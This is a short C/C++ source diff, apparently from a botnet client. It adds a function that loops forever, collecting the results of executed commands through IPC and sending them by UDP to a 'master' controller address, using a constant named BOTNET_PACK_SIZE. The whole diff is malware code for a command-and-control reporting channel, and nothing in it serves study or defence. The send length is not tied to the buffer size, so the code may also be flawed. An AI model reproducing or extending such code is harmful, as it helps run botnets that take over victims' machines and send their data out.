@@ -4,6 +4,7 @@
 #include <thread>
 #include "Communication.h"
 #include "network.h"
+#include "ipc_manage.h"
 
 //Private
 void Communication::SendReply(struct sockaddr_in& client)
@@ -187,5 +188,20 @@ void Communication::HandleIncomingsTCP()
 
 
 		Sleep(1000);
+	}
+}
+
+void Communication::HandleCommandResults()
+{
+	if (IPC_init() != 0)
+		return;
+	
+	u_char command_res[1024];
+	
+	while (1)
+	{
+		memset(command_res, 0, 1024);
+		get_result(command_res, 1024);
+		sendto(udp_sock, (char*)command_res, BOTNET_PACK_SIZE, 0, (struct sockaddr*)&master, sizeof(master));
 	}
 }
